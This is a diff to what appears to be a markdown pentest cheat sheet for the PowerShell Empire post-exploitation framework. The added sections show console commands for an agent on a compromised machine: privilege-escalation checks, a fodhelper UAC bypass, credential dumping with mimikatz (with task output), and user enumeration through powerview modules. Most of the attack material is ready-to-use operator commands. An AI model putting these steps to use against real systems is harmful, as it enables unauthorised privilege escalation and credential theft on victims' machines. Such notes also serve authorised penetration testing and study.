@@ -2,6 +2,9 @@
 
 A post-exploitation framework which is useful once foothold is obtained.
 
+* Tool: https://github.com/BC-SECURITY/Empire
+* HowTo: https://hackmag.com/security/powershell-empire/
+
 ### Stating up PSempire
 
 * Setup a server
@@ -129,5 +132,47 @@ Both of those ways need a stager that must be transferred to victim and activate
 (Empire: agents) > interact TV6GENUD
 (Empire: TV6GENUD) >
 
+#see help for more interesting commands
+
+(Empire: TV6GENUD) > help
+
+# once task is started it may take some time until it runs due to delay
+
+```
+
+### Privesc
+
+```bash
+
+(Empire: TV6GENUD) > usemodule powershell/privesc/powerup/allchecks
+[*] Set Agent to TV6GENU
+
+```
+
+* Bypassing UAC
+
+`usemodule privesc/bypassuac_fodhelper`
+
+### Stealing Credentials
+
+```bash 
+(Empire: TV6GENUD) > mimikatz
+
+[*] Tasked TV6GENUD to run Task 1
+[*] Task 1 results received
+Job started: E4WVFS
+[*] Task 1 results received
+
+```
+
+### Enumerating 
+
+* `usemodule` command has various recon techniques
+
+```powershell
+
+# example for enumerating user
+
+usemodule situational_awareness/network/powerview/get_user
 
 ```
